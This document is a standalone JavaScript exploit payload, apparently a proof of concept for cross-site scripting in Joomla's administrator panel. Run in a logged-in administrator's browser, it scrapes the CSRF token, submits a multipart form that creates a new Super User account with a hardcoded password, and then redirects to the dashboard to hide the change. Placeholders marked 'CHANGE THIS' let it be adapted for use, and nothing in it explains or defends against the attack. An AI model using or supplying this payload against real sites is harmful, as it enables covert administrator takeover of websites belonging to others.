const newAccUser = 'pocuser';               // !!! CHANGE THIS !!!
const newAccPass = 'M4oslW1mQlm9cLGXyVba';  // !!! CHANGE THIS !!!
const newAccEmail = 'pocuser@localhost';    // !!! CHANGE THIS !!!
const joomlaRoot = '';                      // !!! CHANGE THIS !!!
const joomlaNewUserURL = joomlaRoot + '/administrator/index.php?option=com_users&view=user&layout=edit';
const joomlaDashboardURL = joomlaRoot + '/administrator/index.php';
const req = new XMLHttpRequest();
req.open('GET', joomlaNewUserURL, false);
req.send(null);
const csrfToken = req.responseText.match(/"csrf.token":"([^"]*?)"/)[1];
const genRandHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
const boundary = '-----------------------------' + genRandHex(28);
const newline = '\r\n';
const bodyData = boundary + newline +
  'Content-Disposition: form-data; name="jform[name]"' + newline +
  newline +
  newAccUser + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[username]"' + newline +
  newline +
  newAccUser + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[password]"' + newline +
  newline +
  newAccPass + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[password2]"' + newline +
  newline +
  newAccPass + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[email]"' + newline +
  newline +
  newAccEmail + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[registerDate]"' + newline +
  newline +
  newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[lastvisitDate]"' + newline +
  newline +
  newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[lastResetTime]"' + newline +
  newline +
  newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[resetCount]"' + newline +
  newline +
  '0' + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[sendEmail]"' + newline +
  newline +
  '0' + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[block]"' + newline +
  newline +
  '0' + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[requireReset]"' + newline +
  newline +
  '0' + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[id]"' + newline +
  newline +
  '0' + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[groups][]"' + newline +
  newline +
  '8' + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[params][admin_style]"' + newline +
  newline +
  newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[params][admin_language]"' + newline +
  newline +
  newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[params][language]"' + newline +
  newline +
  newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[params][editor]"' + newline +
  newline +
  newline +
  boundary + newline +
  'Content-Disposition: form-data; name="jform[params][timezone]"' + newline +
  newline +
  newline +
  boundary + newline +
  'Content-Disposition: form-data; name="task"' + newline +
  newline +
  'user.apply' + newline +
  boundary + newline +
  'Content-Disposition: form-data; name="' + csrfToken + '"' + newline +
  newline +
  '1' + newline +
  boundary + '--' + newline;
let bodyDataArray = new Uint8Array(bodyData.length);
for(let i = 0; i < bodyDataArray.length; i ++) { bodyDataArray[i] = bodyData.charCodeAt(i); };
req.open('POST', joomlaNewUserURL, true);
req.setRequestHeader('Content-Type', 'multipart\/form-data; boundary=' + boundary.slice(2));
req.withCredentials = true;
req.send(new Blob([bodyDataArray]));
req.onreadystatechange = function() {
  if (req.readyState == XMLHttpRequest.DONE) {
    window.location.replace(joomlaDashboardURL);
  }
}
